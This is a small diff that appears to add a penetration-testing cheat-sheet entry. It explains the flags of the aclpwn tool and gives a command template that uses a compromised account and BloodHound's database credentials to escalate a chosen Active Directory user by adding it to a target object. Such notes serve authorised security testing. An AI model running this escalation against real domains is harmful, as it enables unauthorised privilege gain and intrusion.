@@ -1,0 +1,5 @@
+# -t = the target object (given user will be added to this object) 
+# -u = user to add to object
+# -tt = type of the destination object (User, Group, Domain, Computer)
+aclpwn -f <pownedUser>@<domainName> -t <targetObject> -tt <typeOfObject> -d <domain> -du ne04j -dp <bloodhoundPw> -u <adUserToEscalate>
+
